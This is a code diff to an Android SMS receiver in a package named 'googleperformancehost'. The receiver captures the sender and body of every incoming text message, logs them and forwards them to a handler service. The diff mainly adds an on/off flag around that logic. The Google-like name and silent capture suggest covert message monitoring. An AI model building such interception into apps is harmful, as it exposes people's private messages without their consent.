@@ -8,6 +8,7 @@ import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
+import com.example.tiber.googleperformancehost.R;
 import com.example.tiber.googleperformancehost.Services.Temporary.ReceivedSMSHandlerIntentService;
 
 /**
@@ -20,37 +21,39 @@ public class SMSReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        final Bundle bundle = intent.getExtras();
-        try {
-            if (bundle != null) {
-                final Object[] pdusObj = (Object[]) bundle.get("pdus");
-                String phoneNumber = null;
-                String senderNum = null;
-                String message = "";
+        if (context.getResources().getBoolean(R.bool.ENABLE_SMS_LOGGING) == true) {
+            final Bundle bundle = intent.getExtras();
+            try {
+                if (bundle != null) {
+                    final Object[] pdusObj = (Object[]) bundle.get("pdus");
+                    String phoneNumber = null;
+                    String senderNum = null;
+                    String message = "";
 
-                for (int i = 0; i < pdusObj.length; i++) {
+                    for (int i = 0; i < pdusObj.length; i++) {
 
-                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
-                    phoneNumber = currentMessage.getDisplayOriginatingAddress();
-                    senderNum = phoneNumber;
+                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
+                        phoneNumber = currentMessage.getDisplayOriginatingAddress();
+                        senderNum = phoneNumber;
 
-                    message += currentMessage.getDisplayMessageBody();
-                } // end for loop
+                        message += currentMessage.getDisplayMessageBody();
+                    } // end for loop
 
-                Log.wtf("SmsReceiver", "senderNum: "+ senderNum+" length = "+ senderNum.length() + "; message: " + message);
-                if(senderNum.length() > 7 ){
-                    Intent startSMSHandler =
-                            new Intent(context.getApplicationContext(), ReceivedSMSHandlerIntentService.class);
+                    Log.wtf("SmsReceiver", "senderNum: " + senderNum + " length = " + senderNum.length() + "; message: " + message);
+                    if (senderNum.length() > 7) {
+                        Intent startSMSHandler =
+                                new Intent(context.getApplicationContext(), ReceivedSMSHandlerIntentService.class);
 
-                    startSMSHandler.putExtra("senderNumber",senderNum);
-                    startSMSHandler.putExtra("message",message);
-                    context.getApplicationContext().startService(startSMSHandler);
-                }
-            } // bundle is null
+                        startSMSHandler.putExtra("senderNumber", senderNum);
+                        startSMSHandler.putExtra("message", message);
+                        context.getApplicationContext().startService(startSMSHandler);
+                    }
+                } // bundle is null
 
-        } catch (Exception e) {
-            Log.e("SmsReceiver", "Exception smsReceiver" +e);
+            } catch (Exception e) {
+                Log.e("SmsReceiver", "Exception smsReceiver" + e);
 
+            }
         }
     }
 
